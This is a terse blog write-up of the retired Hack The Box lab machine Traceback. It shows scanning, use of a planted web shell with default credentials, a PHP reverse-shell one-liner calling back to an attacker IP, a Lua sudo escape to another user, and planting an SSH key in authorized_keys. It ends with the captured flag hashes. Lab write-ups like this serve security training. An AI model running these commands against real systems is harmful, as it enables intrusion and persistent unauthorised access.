---
title:  "Hack The Box - Traceback"
date:   2020-05-05
categories: [ctf]
tags: [linux, Kali, Pentest, writeups, ctf]
---
My write-up / walktrough for Traceback on Hack The Box.

Now, Traceback got retired and I'm  allowed to publish my write-up. I added the box to
/etc/hosts as traceback.htb with it's ip 10.10.10.181

![infocard](/images/traceback/infocard.png)

As allways, I started with some enumeration and scanned `traceback.htb` with `nmap -sTV -p 1-10000 -oN nmap_tcp_scan traceback.htb`. Not very silent, but ok for ctf-boxes.

![nmap](/images/traceback/nmap.png)

`nmap` showed only open ports for ssh and a website, so let's take a look at the website. Hmmm, first, I thought, some other ctf-player let some traces behind, but it seems to be intended.

![website](/images/traceback/website.png)

foothold

![website_comment](/images/traceback/website_comment.png)

https://github.com/Xh4H/Web-Shells/blob/master/README.md

die shell is smevk.php
creds are admin:admin

![webshell](/images/traceback/webshell.png)

```
- sysadmin
I have left a tool to practice Lua
I'm sure  you know where to find it
Contact me if you have any question
```
opened a reverse shell 

sudo nc -lvp 443


php -r '$sock=fsockopen("10.10.14.13",443); exec("/bin/sh -i <&3 >&3 2>&3");'

![reverseshellweb](/images/traceback/reverseshellWeb.png)

![reverseshelllocal](/images/traceback/reverseshelllocal.png)

![bashhistory](/images/traceback/bashHistory.png)

https://gtfobins.github.io/gtfobins/lua/ 

'lua -e 'os.execute("/bin/sh")''

sudo -u sysadmin /home/sysadmin/luvit privesc.lua

find / -name *lua* -print 2>/dev/null

fd620301d0c1f58876d350a004f31933


![userflag](/images/traceback/userflag.png)


 echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ/TCL/WRRYaHSKz5lXROlQjWHpY6kH/rdNQgQkZIXmpJb48POZX6ros00pDDB049dcX8OjAh0RJhI+8IfsauBqUpMk8MKfiGa1H2rwIgj3eVE1053CTc00n/HMZ7qi/dtt4JUQzI0Y91DIeEq/YJ3eEIZtsQwQx27hIx1P9gPcvBCeUPoWqPlE/rw9vu13dKyPIc7xM8vppWvZOKPAbaG3hvpE8T3mehRFP48DfIC/99SUuKSoY2eF8ZlsJhBSCi+Q3R1iXrPJP4rU+c8odx/0fbwOPSQBlt/oFbxXSIcwVbxAg5UrgfxveIhptif2r79k1SwC0Cf3a/T1zHNUDvheF3pcDtAQZzva/XKS/i88A4lYIdq63IgKBlZEilT4duxZ+Nxa9JQC+ii+q7nNjuA/aJj5r7seKMgYBPn3ZA3bdO0ZQ1PoT/cXyn4B56ILBheCiVhRpeXRhoYo2esvN2Wwb9AzLhiothDST1s3kshc36qqecdad5RnAB5c08kDLc= faebu@kali >> /home/webadmin/.ssh/authorized_keys

![ssh](/images/traceback/ssh_shell.png)

e9bece3c49a50bf0fb819ee50285085f

![root](/images/traceback/rootflag.png)